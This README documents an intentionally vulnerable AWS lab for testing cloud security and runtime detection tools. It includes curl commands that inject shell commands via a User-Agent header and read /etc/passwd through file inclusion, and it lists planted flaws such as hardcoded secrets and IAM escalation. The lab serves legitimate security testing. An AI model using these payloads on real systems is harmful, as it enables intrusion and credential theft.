# CNAPPuccino — Vulnerable Cloud Lab (CSPM + Runtime)

Intentionally vulnerable Ubuntu lab for CSPM and runtime testing. Deploys on AWS EC2 with Apache, Nginx, PHP, and multiple exploitable paths.

## Safety First
- Never deploy in production accounts or networks
- Use isolated test accounts and CIDR restrictions
- Clean up when done (Option 8)

## Design Philosophy
- Single‑Shot Deploy: one menu/script drives deploy → validate → exploit → cleanup
- Living‑Off‑The‑Land: only Bash, Terraform, and AWS CLI (no Python/Ansible/Docker needed to use)
- Predictable: idempotent Terraform; two‑stage user_data to stay below 16 KB
- Educational: clear mapping to OWASP + MITRE ATT&CK

## Repository Structure
```
cnappuccino/
├── README.md                       # Overview and usage
├── RUNTIME_TESTING.md              # Detailed testing guide
├── LICENSE                         # License
├── start.sh                        # Interactive TUI + CLI (menu + flags)
├── terraform/                      # Infrastructure as Code
│   ├── main.tf                     # AWS infra (VPC, SG, EC2, IAM)
│   ├── variables.tf                # Inputs (region, owner, etc.)
│   ├── outputs.tf                  # Outputs (public_ip, ids)
│   ├── versions.tf                 # Provider constraints
│   ├── cloud-init-bootstrap.sh.tmpl# Stage 1 (tiny user_data)
│   ├── user_data.sh                # Stage 2 (full bootstrap)
│   └── assets/
│       ├── configs/                # Apache/Nginx/PHP configs
│       ├── scripts/                # exec.cgi, ciem_test.sh, tests
│       └── web/                    # index.html, view.php, upload.php
├── testing/                        # Local test harness (optional)
│   ├── README.md                   # Local testing docs
│   ├── test_user_data.sh           # Local runner
│   └── docker/                     # Containerized test env
└── cnappuccino-state/              # Local keys/state (gitignored)
```

## Architecture (2‑Stage Bootstrap)
- Stage 1 (tiny user_data): `terraform/cloud-init-bootstrap.sh.tmpl`
  - base64gzip’d user_data; waits for network; ensures curl/CA
  - downloads Stage 2 from GitHub raw and executes (checksum logged)
- Stage 2 (full install): `terraform/user_data.sh`
  - installs packages and configures Apache/Nginx/PHP
  - writes phase markers and detailed logs
  - local fallbacks if downloads fail (exec.cgi, view.php, vhost, Nginx, CIEM script, secrets)

## Prerequisites
- AWS CLI configured, Terraform ≥ 1.6, Bash shell

## Quick Start
1) Clone + run menu
   - `git clone https://github.com/adilio/CNAPPuccino.git && cd cnappuccino && ./start.sh`
2) Deploy
   - Menu: Option 2 (Stage 1). Ready in ~10–15 min
3) Validate
   - Option 3 (Quick RCE) or `./start.sh test`
4) Cleanup
   - Option 8

## CLI Usage (non‑interactive)
```
./start.sh [flags] <command>

Flags:
  --owner OWNER          Set owner tag (default: barista)
  --region REGION        AWS region (default: us-east-1)
  --instance-type TYPE   Instance type (default: t3.medium)
  --profile PROFILE      AWS profile (default: default)
  --help, -h             Show help

Commands:
  deploy   Quick deploy with current/default settings
  status   Show deployment status
  test     Run quick exploit tests
  cleanup  Destroy resources
  menu     Interactive menu (default)

Examples:
  ./start.sh --owner john deploy
  ./start.sh --region us-west-2 --owner test deploy
  ./start.sh status
  ./start.sh cleanup
```

## Fast Validation (no soak)
- Quick RCE: Menu Option 3
- Manual checks (copy/paste):

Export instance IP from Terraform:
```bash
export TARGET_IP=$(cd terraform && terraform output -raw public_ip)
```

CGI RCE (Shellshock‑style header — shows web user, expect www-data):
```bash
curl -s -H "User-Agent: () { :; }; whoami" http://$TARGET_IP/cgi-bin/exec.cgi
```

CGI RCE (ID, hostname, kernel info):
```bash
curl -s -H "User-Agent: id; hostname; uname -a" http://$TARGET_IP/cgi-bin/exec.cgi
```

PHP LFI (/etc/passwd):
```bash
curl -s "http://$TARGET_IP/view.php?file=/etc/passwd"
```

Nginx directory listing (:8080/secret/):
```bash
curl -s "http://$TARGET_IP:8080/secret/"
```

## Runtime Exploits (Option 5)
- Five stages: system recon, credential harvesting, file enumeration, process enumeration, CIEM
- CIEM uses `LAMBDA_ADMIN_ROLE_ARN` (injected into Apache CGI env) to attempt assume‑role and create a Lambda
- Recommended after 24h soak; can run immediately for demo

## Monitoring
- Enhanced progress (offered during deploy)
  - Real‑time phase + last 20 log lines; refresh every 3s
  - Logs on instance: `/var/log/cnappuccino-bootstrap.log`
- Diagnostics: Option 4 (Lab Status & Diagnostics)

## Vulnerable Endpoints
- CGI RCE: `http://<ip>/cgi-bin/exec.cgi`
- LFI: `http://<ip>/view.php?file=/etc/passwd`
- Upload: `http://<ip>/upload.php`
- Directory listing: `http://<ip>:8080/secret/`

## Vulnerability Matrix
| Vulnerability                                | CVE            | OWASP          | MITRE                               | Endpoint/Vector                                   |
|----------------------------------------------|----------------|----------------|-------------------------------------|---------------------------------------------------|
| Shellshock‑style CGI command injection       | CVE‑2014‑6271* | A06:2021       | T1059.004 (Unix Shell), T1190       | `http://IP/cgi-bin/exec.cgi` (User‑Agent header)  |
| Heartbleed (weak SSL example)                | CVE‑2014‑0160  | A06:2021       | T1005, T1040                        | `https://IP:8443`                                 |
| PHP Local File Inclusion                     | —              | A03:2021       | T1005, T1083                        | `http://IP/view.php?file=…`                       |
| Unrestricted File Upload                     | —              | A03/A04:2021   | T1105, T1059.004                    | `http://IP/upload.php`                            |
| Directory Listing                            | —              | A01/A05:2021   | T1083, T1552.001                    | `http://IP:8080/secret/`                          |
| Weak SSH (password auth enabled)             | —              | A07:2021       | T1110.001, T1078.003                | `ssh ubuntu@IP`                                   |
| Hardcoded Secrets                            | —              | A07/A09:2021   | T1552.001, T1078                    | `/var/www/html/.env`, `/opt/cnappuccino/secret/`  |
| Disabled Firewall (ufw)                      | —              | A05:2021       | T1562.004                           | System‑wide                                       |
| Weak SSL/TLS                                 | —              | A02/A05:2021   | T1040, T1557                        | `https://IP:8443`                                 |
| IMDSv1 Enabled                               | —              | A05:2021       | T1552.006                            | EC2 Metadata Service                              |
| End‑of‑Life OS                               | Multiple       | A06:2021       | T1082                               | System‑wide                                       |

\*Shellshock function‑import is patched; exploitation here is direct command injection via header.

## Troubleshooting

### Deployment & Bootstrap
- Check status: `./start.sh status`
- Enhanced monitor: choose it during Option 2 (refresh 3s, last 20 log lines)
- Instance logs: `ssh ubuntu@<ip>` then `sudo tail -n 100 /var/log/cnappuccino-bootstrap.log`
- Services: `systemctl status apache2 nginx ssh --no-pager`
- Ports: `ss -tlnp | grep -E ':(80|8080|8443|22) '` or `netstat -tlnp`
- Clean redeploy: Option 8 (Cleanup), then Option 2 (Deploy)

Common issues
- CGI 404 on `/cgi-bin/exec.cgi`:
  - Cause: Apache vhost not present; asset download hiccup
  - Fix: Stage 2 now writes a fallback vhost + CGI script; `sudo systemctl restart apache2`
- LFI 404 on `/view.php`:
  - Cause: Asset download hiccup
  - Fix: Stage 2 creates a vulnerable fallback `view.php`
- Nginx `:8080` not listing:
  - Cause: Site config missing
  - Fix: Stage 2 creates a fallback site; `sudo nginx -t && sudo systemctl restart nginx`
- CIEM shows `LAMBDA_ADMIN_ROLE_ARN not set`:
  - Cause: CGI env lacked role ARN
  - Fix: Stage 2 injects `SetEnv`; ensure Apache restarted
- Credential file permission denied:
  - Cause: restrictive perms
  - Fix: Stage 2 sets `/opt/cnappuccino/secret` 755 and `aws_creds.txt` 644
- GitHub downloads fail:
  - Stage 1 waits for network, installs CA certs, retries; Stage 2 has local fallbacks

Terraform issues
- Re‑init providers: `cd terraform && terraform init -upgrade`
- Show plan/apply errors: `terraform plan` then `terraform apply`
- Get instance IP: `terraform output -raw public_ip`

## Notes
- User data size: ≤ 16 KB (Stage 1 only). Stage 2 is downloaded at runtime
- Fallbacks ensure CGI RCE, LFI, and dir listing work even if asset downloads fail
- Deterministic boots: pin Stage 2 to a commit/tag in `main.tf` if needed

## Contributing
- Keep it simple; avoid new runtime dependencies
- Test changes in an isolated account
- Document new behaviors briefly and clearly

## Legal
Educational use only. You are responsible for compliant use and costs. The authors assume no liability for misuse.
